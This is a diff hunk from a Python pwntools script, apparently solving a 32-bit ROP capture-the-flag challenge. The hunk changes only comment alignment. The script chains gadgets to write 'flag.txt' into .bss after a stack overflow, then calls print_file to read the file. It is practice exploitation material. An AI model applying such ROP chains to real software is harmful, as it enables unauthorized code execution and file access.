@@ -33,13 +33,13 @@ for k, v in e.sym.items():
 # pwn.gdb.attach(p)
 
 payload = b'A' * 0x28 + b'B' * 4 + pop_edi_ebp_addr + pwn.p32(bss_addr) + b'flag' + mov_ebp__edi__addr  
-#                                           #  pop bss_addr to edi  | pop 'flag' to ebp  | mov 'flag' to (%edi) -> bss_addr
+#                                              pop bss_addr to edi  | pop 'flag' to ebp  | mov 'flag' to (%edi) -> bss_addr
 payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 4) + b'.txt' + mov_ebp__edi__addr
-#                           #  pop bss+4 to edi  | pop '.txt' to ebp  | mov '.txt' to (%edi) -> bss+4
+#                              pop bss+4 to edi  | pop '.txt' to ebp  | mov '.txt' to (%edi) -> bss+4
 payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 8) + pwn.p32(0) + mov_ebp__edi__addr
-#                           #  pop bss+8 to edi  | pop '\0' to ebp  | mov '\0' to (%edi) -> bss+8
+#                              pop bss+8 to edi  | pop '\0' to ebp  | mov '\0' to (%edi) -> bss+8
 payload += print_file_plt + b'RRRR' + pwn.p32(bss_addr)                                                 
-#                                #  bss_addr = 'flag.txt\0'
+#                                   bss_addr = 'flag.txt\0'
 p.sendlineafter(b'> ', payload)
 p.recv()
 ```
